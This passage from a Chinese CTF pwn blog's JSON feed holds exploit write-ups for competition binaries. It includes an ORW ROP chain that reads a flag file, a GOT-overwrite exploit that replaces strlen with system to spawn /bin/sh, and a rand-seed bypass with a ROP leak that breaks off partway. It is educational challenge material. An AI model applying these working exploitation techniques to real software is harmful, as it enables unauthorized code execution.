punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>pop_rdi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000023b6a</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>pop_rsi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000002601f</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>pop_rdx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000142c92</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>write_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>sendfile_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'sendfile'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>puts <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>flag_addr <span class=\"token operator\">=</span> stack_addr</pre></td></tr><tr><td data-num=\"121\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'./flag\\x00\\x00'</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre><span class=\"token comment\"># open('./flag', 0)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>open_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre><span class=\"token comment\"># read(3, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdx_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre><span class=\"token comment\"># write(1, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(stack_addr - 0x200) + p64(pop_rdx_ret) + p64(0x50) + p64(write_addr)</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(3) + p64(pop_rdx_ret) + p64(0) + p64(sendfile_addr)</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre></pre></td></tr><tr><td data-num=\"136\"></td><td><pre></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "堆拓展攻击",
                "orw",
                "堆栈结合"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/",
            "url": "https://yhuanhuan01.github.io/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/",
            "title": "国赛复现",
            "date_published": "2023-08-03T09:17:58.000Z",
            "content_html": "<h1 id=\"国赛题复现\"><a class=\"markdownIt-Anchor\" href=\"#国赛题复现\">#</a> 国赛题复现</h1>\n<p>不同地区的国赛题，进行复现。— 简单 pwn 题</p>\n<h3 id=\"华北赛区\"><a class=\"markdownIt-Anchor\" href=\"#华北赛区\">#</a> 华北赛区：</h3>\n<h3 id=\"relro保护机制\"><a class=\"markdownIt-Anchor\" href=\"#relro保护机制\">#</a> RELRO 保护机制</h3>\n<p><strong>1.RELRO 的保护机制可用于防护 <code>GOT hijacking</code> ，其全名为 <code>Relocation Read-Only</code> 。</strong></p>\n<p><strong>2. 本题中 <code>checksec</code>  中为 <code>Partial RELRO</code> ，这种情况下， <code>GOT</code>  可写，即存在 <code>GOT hijacking</code>  的漏洞</strong></p>\n<p><strong>3. 而保护的方式是设置为 <code>Full RELRO</code> ，这种情况下不会出现 <code>lazy binding</code> ，因为在 <code>Load time</code>  时会将所有 <code>funciton resolve</code>  完毕，并设置 <code>GOT</code>  不可写。</strong></p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090133980.png\" alt=\"image-20230717090133980\"></p>\n<p>给到的附件是这两个。</p>\n<h5 id=\"检查程序\"><a class=\"markdownIt-Anchor\" href=\"#检查程序\">#</a> 检查程序</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090248188.png\" alt=\"image-20230717090248188\"></p>\n<p>开启了堆栈不可执行和 pie 保护。</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090403892.png\" alt=\"image-20230717090403892\"></p>\n<p>普通的执行并没有发现什么东西</p>\n<h5 id=\"放入ida\"><a class=\"markdownIt-Anchor\" href=\"#放入ida\">#</a> 放入 IDA</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/OLUQRFR5HLPTU%258MV3M%259%5DR.png\" alt=\"img\"></p>\n<p>这是给到的几个函数</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090604786.png\" alt=\"image-20230717090604786\"></p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090621694.png\" alt=\"image-20230717090621694\"></p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090637164.png\" alt=\"image-20230717090637164\"></p>\n<p>这是其中有用的函数，接下来进行分析</p>\n<ol>\n<li></li>\n</ol>\n<p>其中 v2 数组在他的索引 0 的位置有 puts 函数的地址。</p>\n<p>main 函数显示调用了 96B 这个函数，96B 内有个 scanf 函数，他的参数是 %252s，这里要记住，要用到，往下看，还有是 sacnf，这里主要是绕过判断的。只要绕过这个判断，我们就能得到 v2 的索引 0 处的地址。</p>\n<p><strong>参数 % s</strong><br>\n<strong>% s 参数在 PWN 题中的应用应该是最常见的了。scanf (“% s”, a) 实际上与 gets 一样危险，均不会检查 a 的边界，出现在题中一定是一个可以进行栈溢出或堆溢出的重点。这里注意其与 read 函数相同，可以读取 \\x00 后面的内容，仅将换行作为输入读取的结束标志。不过这里要注意的是，% s 参数会以空格作为分隔符，也就是说，如果输入中含有空格，那么空格前后的内容会被分配到不同的 % s 参数中。这一点在使用 scanf 进行溢出时需要注意，否则容易造成 ROP 链断裂等问题。</strong></p>\n<p>里面 V4 是个局部变量，这样我们可以利用第一个 scanf 把它覆盖成 0。第一个函数我们思路有了，接下来就是第二个函数的思路。</p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>第三个 scanf，这是用来绕过判断的。一共有两个 read 函数，第一个 read 函数没啥用，有意思的就是第二个 read 函数。</p>\n<pre><code>栈中的数组越界：\n因为栈是向下增长的，在进入一个函数之前，会先把参数和下一步要执行的指令地址（通过call实现）压栈，在函数的入口会把ebp压栈，并把esp赋值给ebp，在函数返回的时候，将ebp值赋给esp，pop先前栈内的上级函数栈的基地址给ebp，恢复原栈基址，然后把调用函数之前的压入栈的指令地址pop出来（通过ret实现）。\n栈是由高往低增长的，而数组的存储是由低位往高位存的，如果越界的话，会把当前函数的ebp和下一跳的指令地址覆盖掉，如果覆盖了当前函数的ebp，那么在恢复的时候esp就不能指向正确的地方，从而导致未可知的情况，如果下一跳的地址也被覆盖掉，那么肯定会导致crash。\n</code></pre>\n<p>所以通过第二个 read 函数，去控制修改地址。首先就是去做到覆盖，这种覆盖也是第一次见，是看 bss 段里大小去覆盖。</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717143008203.png\" alt=\"image-20230717143008203\"></p>\n<p>覆盖 0x1c 字节大小，覆盖完后去修改地址，但是因为 v0 是通过 rax 去存参的，所以需要去传两遍参，正好有两次传参机会，我们可以去修改 close 函数，变成一个我们想要去程序执行的函数。</p>\n<p>这里我们要重新返回执行 A31 这个函数，接下来就是重头戏，去修改 got 表。</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717143729215.png\" alt=\"image-20230717143729215\"></p>\n<p>非常关键一点就是这里，我们可以修改 strlen 函数，变成 system 函数，在给他传个 bin/sh 即可</p>\n<h5 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>terminal<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'split'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> local <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    io <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    io <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xfc</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'challen'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Good luck!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'22'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>libc_base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>system <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>strlen_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'strlen'</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>strlen_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'index>>\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># sleep(0.1)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'input>>\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># gdb.debug()</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># gdb.attach(io)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>paylaod <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1c</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x88\\xff\\xff\\xff'</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>paylaod<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\"># gdb.attach(io)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\"># io.recvuntil(b'bye~\\n')</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\"># payload1 = b'\\xe0\\xef'</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'bye~\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x31\\x0a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">b'c'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x1c</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x78\\xff\\xff\\xff'</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input>>\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'bye~\\n'</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\"># gdb.attach(io)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input>>\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\"># io.send(b'a')</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"华东赛区\"><a class=\"markdownIt-Anchor\" href=\"#华东赛区\">#</a> 华东赛区：</h3>\n<h5 id=\"检查程序-2\"><a class=\"markdownIt-Anchor\" href=\"#检查程序-2\">#</a> 检查程序：</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722171805702.png\" alt=\"image-20230722171805702\"></p>\n<h5 id=\"执行程序\"><a class=\"markdownIt-Anchor\" href=\"#执行程序\">#</a> 执行程序：</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722171849970.png\" alt=\"image-20230722171849970\"></p>\n<h5 id=\"放入ida-2\"><a class=\"markdownIt-Anchor\" href=\"#放入ida-2\">#</a> 放入 IDA：</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722172024544.png\" alt=\"image-20230722172024544\"></p>\n<h5 id=\"发现漏洞函数\"><a class=\"markdownIt-Anchor\" href=\"#发现漏洞函数\">#</a> 发现漏洞函数：</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722172050505.png\" alt=\"image-20230722172050505\"></p>\n<p>整体思路，绕过随机数检查判断，到达漏洞函数，获取 shell。seed 种子是 4 字节大小要注意</p>\n<h5 id=\"exp-2\"><a class=\"markdownIt-Anchor\" href=\"#exp-2\">#</a> exp:</h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span> local <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x40101a</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>pop_rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x00401443</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>main <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>gift <span class=\"token operator\">=</span> <span class=\"token number\">0x040125D</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>b <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># v6 = (libc.rand(b)-1) %100 +2</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># p.sendafter(b'number:\\n',p32(v6))</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    v6 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span><span class=\"token number\">100</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'number:\\n'</span><span class=\"token punctuation\">,</span>p32<span class=\"token punctuation\">(</span>v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span 